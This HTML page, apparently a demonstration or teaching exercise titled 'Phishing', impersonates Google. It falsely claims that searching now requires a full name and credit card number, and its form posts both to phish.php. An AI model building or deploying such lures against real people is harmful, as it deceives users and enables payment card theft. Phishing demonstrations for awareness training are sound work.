<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Phishing</title>
</head>
<body>
<h1>Google.com!</h1>
<p>
    Welcome to Google.com <br/>
    Google now requires your full name and credit card number before you are
    allowed to make a search.
</p>
<form action="phish.php" method="post">
    <fieldset>
        Name: <input type="text" name="name"/><br/>
        Credit Card Number: <input type="text" name="ccn"/><br/> Search Query: <input
                type="text" name="query"/> <br/> <input type="submit" value="I’m feeling lucky" name="submit-btn"/>
    </fieldset>
</form>
</body>
</html>